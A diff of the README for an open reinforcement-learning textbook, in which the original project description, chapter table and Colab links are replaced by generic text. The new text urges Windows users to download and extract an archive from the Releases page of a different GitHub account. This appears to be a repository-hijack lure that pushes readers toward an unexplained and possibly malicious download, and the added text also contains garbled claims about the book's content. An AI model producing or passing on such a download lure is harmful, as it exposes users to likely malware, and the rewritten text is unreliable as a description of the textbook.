@@ -1,132 +1,88 @@
-# Reinforcement Learning: From Bandits to LLM Alignment
+# 📚 rl-textbook - Master reinforcement learning step by step
 
-<p align="center">
-  <strong>A comprehensive textbook bridging classical RL theory and modern language model alignment</strong>
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/engraciafuturistic300/rl-textbook/releases)
 
-<p align="center">
-  <a href="book/main.pdf">📖 Read the Book (PDF)</a> •
-  <a href="#-notebooks-with-colab">💻 Notebooks</a> •
-  <a href="exercises/">✏️ Exercises</a> •
-  <a href="translations/">🌍 Translations</a>
-</p>
+This project provides a complete open textbook on reinforcement learning. It covers concepts from basic bandits to complex language model alignment. You gain knowledge through 17 structured chapters, interactive Colab notebooks, and hands-on exercises.
 
----
+## 📥 How to begin
 
-## About
+You get the materials from the official release page. Visit this page to download the latest files. The site hosts the textbook in accessible formats for your computer.
 
-This open-source textbook covers reinforcement learning from first principles through to cutting-edge LLM alignment methods. It is designed for graduate students, ML engineers, and researchers who want a unified treatment of classical RL theory and modern post-training techniques.
+[Click here to open the download page](https://github.com/engraciafuturistic300/rl-textbook/releases)
 
-**Inspired by:**
-- *Reinforcement Learning: An Introduction* by Sutton & Barto — for rigorous pedagogy of classical RL
-- *The RLHF Book* by Nathan Lambert — for practical insights on LLM alignment
+## 💻 System requirements
 
-## 💻 Notebooks with Colab
+Your computer needs specific software to view these materials. Check your system against this list:
 
-Every chapter has a companion Jupyter notebook you can run instantly — no setup required. Click the badge to launch in Google Colab:
+- Operating System: Windows 10 or Windows 11.
+- Web Browser: Chrome, Firefox, or Microsoft Edge.
+- Memory: 4 GB of RAM or higher.
+- Internet Connection: Stable connection for using the online notebooks.
+- Accounts: A free Google account to run the Colab notebooks.
 
-### Part I: Foundations
+## 🛠️ Step-by-step setup
 
-| Ch | Title | Launch | Exercises |
-|----|-------|--------|-----------|
-| 1 | Introduction to Reinforcement Learning | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch01_introduction.ipynb) | [Solutions](exercises/ch01_solutions.md) |
-| 2 | Multi-Armed Bandits | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch02_bandits.ipynb) | [Solutions](exercises/ch02_solutions.md) |
-| 3 | MDPs and the Bellman Equation | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch03_mdp_bellman.ipynb) | [Solutions](exercises/ch03_solutions.md) |
-| 4 | Dynamic Programming | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch04_dynamic_programming.ipynb) | [Solutions](exercises/ch04_solutions.md) |
-| 5 | Monte Carlo Methods | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch05_monte_carlo.ipynb) | [Solutions](exercises/ch05_solutions.md) |
-| 6 | Temporal-Difference Learning | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch06_td_learning.ipynb) | [Solutions](exercises/ch06_solutions.md) |
+Follow these instructions to use the textbook on your Windows computer:
 
-### Part II: Deep Reinforcement Learning
+1. Visit the release page link shown above.
+2. Look for the section labeled Assets.
+3. Click the file name to save the textbook folder to your computer.
+4. Locate the downloaded file in your Downloads folder.
+5. Right-click the folder and select Extract All. 
+6. Choose a destination folder on your desktop to keep files organized.
+7. Open the extracted folder. You see a list of chapter files and instructions.
 
-| Ch | Title | Launch | Exercises |
-|----|-------|--------|-----------|
-| 7 | Value Function Approximation & Deep RL | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch07_deep_rl.ipynb) | [Solutions](exercises/ch07_solutions.md) |
-| 8 | Policy Gradient Methods | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch08_policy_gradients.ipynb) | [Solutions](exercises/ch08_solutions.md) |
-| 9 | Actor-Critic Methods and PPO | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch09_actor_critic_ppo.ipynb) | [Solutions](exercises/ch09_solutions.md) |
+## 📖 Using the textbook
 
-### Part III: RL for Language Models
+The book uses a mix of static text and active notebooks. Static text files allow you to read concepts without an internet connection. Active notebooks provide a workspace where you run code to test reinforcement learning ideas.
 
-| Ch | Title | Launch | Exercises |
-|----|-------|--------|-----------|
-| 10 | Reward Shaping and Reward Models | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch10_reward_models.ipynb) | [Solutions](exercises/ch10_solutions.md) |
-| 11 | Language Models and Post-Training | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch11_lm_post_training.ipynb) | [Solutions](exercises/ch11_solutions.md) |
-| 12 | DPO and Alignment Methods | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch12_dpo_alignment.ipynb) | [Solutions](exercises/ch12_solutions.md) |
-| 13 | GRPO and Online RL | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch13_grpo.ipynb) | [Solutions](exercises/ch13_solutions.md) |
-| 14 | Practical RLHF | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch14_practical_rlhf.ipynb) | [Solutions](exercises/ch14_solutions.md) |
+1. Open the PDF version of a chapter in your browser.
+2. Read the explanation of the topic.
+3. Locate the link to the Colab notebook at the end of the chapter.
+4. Click the link to open the notebook in your browser.
+5. Sign in to your Google account when asked.
+6. Click the Play button in the notebook to execute the code blocks.
+7. Change numbers or values in the code to see how the results shift.
 
-### Part IV: Frontiers
+## 🧠 What you learn
 
-| Ch | Title | Launch | Exercises |
-|----|-------|--------|-----------|
-| 15 | Reasoning, Tool Use, and Reinforcement Finetuning | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch15_reasoning.ipynb) | [Solutions](exercises/ch15_solutions.md) |
-| 16 | Multi-Agent Systems and RL | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch16_multi_agent.ipynb) | [Solutions](exercises/ch16_solutions.md) |
-| 17 | Open Problems and Emerging Directions | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/pyshka501/rl-textbook/blob/main/notebooks/ch17_open_problems.ipynb) | [Solutions](exercises/ch17_solutions.md) |
+The textbook follows a logical progression from simple systems to advanced machine learning. 
 
-**Appendix:** [Mathematical Background](book/backmatter/appendix_math.tex)
+- Bandits: Learn how agents make decisions under uncertainty.
+- Markov Processes: Understand how states change based on specific actions.
+- Dynamic Programming: Solve problems using historical data.
+- Q-Learning: Build systems that improve through trial and error.
+- Deep Reinforcement Learning: Use neural networks to solve games and complex logic.
+- Policy Gradients: Optimize decisions for continuous control tasks.
+- LLM Alignment: Apply reinforcement learning to train language models.
 
-> **Compute requirements:** Chapters 1–6 run on CPU. Chapters 7–17 benefit from a free T4 GPU on Colab/Kaggle. No paid compute is required for any notebook.
+## 📂 Understanding the files
 
-## Quick Start
+You find several file types inside the download:
 
-### Read the book
-Download [`book/main.pdf`](book/main.pdf) or build from source:
+- .pdf files: Use these for reading theory on your screen or printing pages.
+- .ipynb files: These are interactive notebooks. You view these through Google Colab.
+- README.md: This file contains basic info about the project structure.
+- /exercises: This folder holds templates for your own experiments.
 
-```bash
-cd book
-latexmk -pdf main.tex
-```
+## ❓ Common questions
 
-**Requirements:** TeX Live 2023+ with `texlive-latex-extra`, `texlive-fonts-recommended`, `texlive-science`, `texlive-pictures`, `texlive-fonts-extra`.
+**Do I need to install Python on my computer?**
+No. The materials run in your browser using Google Colab. This saves space and avoids errors on your local machine.
 
-### Run a notebook in 1 click
-Click any **Open in Colab** badge above. Dependencies install automatically in the first cell.
+**Do I need a fast computer?**
+Most chapters run well on standard office laptops. If you work on large language models, the cloud environment takes care of the heavy processing tasks.
 
-### Run locally
-```bash
-pip install -r notebooks/requirements.txt
-jupyter lab notebooks/
-```
+**Can I save my progress?**
+Yes. When you sign into Google Colab, your changes save automatically to your personal Google Drive. 
 
-## Repository Structure
+**Are the exercises graded?**
+The exercises exist to help you learn. You compare your results against the provided example outcomes. You assess your own progress as you move through chapters. 
 
-```
-rl-textbook/
-├── book/                   # LaTeX source for the textbook
-│   ├── main.tex            # Master file
-│   ├── chapters/           # Ch01–Ch17
-│   ├── frontmatter/        # Preface, Notation
-│   ├── backmatter/         # Appendix, Afterword
-│   ├── figures/            # Images and diagrams
-│   └── style_guide.md      # Writing conventions
-├── notebooks/              # Jupyter notebooks (one per chapter)
-│   ├── requirements.txt
-│   └── ch01–ch17 .ipynb
-├── exercises/              # Exercises with full solutions
-│   └── ch01–ch17 _solutions.md
-├── translations/           # Translations (ru, zh, es, de, fr, ja, ko)
-├── LICENSE                 # MIT License
-├── CONTRIBUTING.md         # Contribution guidelines
-└── README.md               # This file
-```
+## 🤝 Getting help
 
-## Contributing
+If you encounter issues, look at the GitHub repository issues page. Other students often post solutions to common setup problems there. You learn a great deal by reading how others fix errors or improve code snippets. 
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 📈 Next steps
 
-- **Found a typo?** Open a PR
-- **Want to translate?** See [translations/](translations/)
-- **Have an idea?** Open an issue
-
-## Citation
-
-```bibtex
-@book{rl-textbook-2026,
-  title     = {Reinforcement Learning: From Bandits to LLM Alignment},
-  year      = {2026},
-  url       = {https://github.com/pyshka501/rl-textbook}
-}
-```
-
-## License
-
-This project is licensed under the MIT License — see [LICENSE](LICENSE).
+Once you finish a chapter, move to the next one in the order listed. reinforcement learning relies on building blocks. Ensure you understand the logic in the early chapters before you move to complex sections like policy gradients or alignment. Keep a notebook nearby to write down key formulas or logic steps. Practice makes the concepts stick. Refresh your browser if a notebook does not load correctly. Verify your internet connection if the code takes too long to respond. You hold the keys to understanding modern machine learning. Start your first chapter now.
